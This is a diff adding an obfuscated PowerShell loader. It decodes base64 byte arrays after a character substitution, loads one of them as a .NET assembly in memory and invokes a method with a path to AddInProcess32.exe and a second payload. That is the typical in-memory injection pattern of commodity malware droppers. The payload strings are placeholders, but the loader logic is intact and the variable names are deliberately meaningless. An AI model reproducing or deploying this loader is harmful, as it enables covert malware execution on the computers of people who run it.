@@ -1,0 +1,11 @@
+$dadqdqwdwqdfqfqpoiu = 'C:\Windows\Microsoft.NET\' + 'Framework\v4.0.30319\' + 'AddInProcess32.exe';
+$dadadqwdq = '↓:↓';
+$dasdafqqeq = 'A';
+$ummtu = '----'.replace( $dadadqwdq, $dasdafqqeq );
+[Byte[]] $laWwJ = [System.Convert]::FromBase64String( $ummtu );
+$mbclK = '===='.replace( $dadadqwdq, $dasdafqqeq );
+[Byte[]] $anKlo = [System.Convert]::FromBase64String( $mbclK );
+$vKedc = "meupiru";
+$szXhh = "caguei" ;
+$eyXHj = "fodasedemais.";
+[System.AppDomain]::CurrentDomain.Load( $laWwJ ).GetType( $eyXHj + $vKedc ).GetMethod( $szXhh ).Invoke($null, [Object[]] ($dadqdqwdwqdfqfqpoiu, $anKlo) );
